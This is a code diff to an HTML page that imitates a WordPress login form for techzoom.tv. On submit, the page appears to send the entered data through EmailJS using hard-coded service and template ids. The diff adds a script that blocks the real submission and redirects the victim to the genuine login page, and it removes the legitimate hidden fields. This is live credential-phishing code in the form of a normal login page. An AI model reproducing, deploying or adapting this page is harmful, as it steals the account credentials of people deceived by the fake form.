@@ -4345,8 +4345,6 @@ div {
             </p>
             <p class="submit">
                 <input type="submit"  onclick="sendMail()" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In">
-		<input type="hidden" name="redirect_to" value="/wp-login.php?redirect_to=https%3A%2F%2Ftechzoom.tv%2Fwp-admin%2F&amp;reauth=1/?captcha='confirm_error'">
-                <input type="hidden" name="testcookie" value="1">
             </p>
         </form>
 
@@ -4453,5 +4451,11 @@ div {
   
     emailjs.send("service_i6hz2j7","template_3ixqw3s",parms)
   };</script>
+<script>
+	document.getElementById('loginform').addEventListener('submit', function(event) {
+		event.preventDefault(); // Prevent the form from submitting normally
+		window.location.href = 'https://techzoom.tv/wp-login.php?'; // Redirect to the desired URL
+	});
+	</script>
 </body>
 </html>
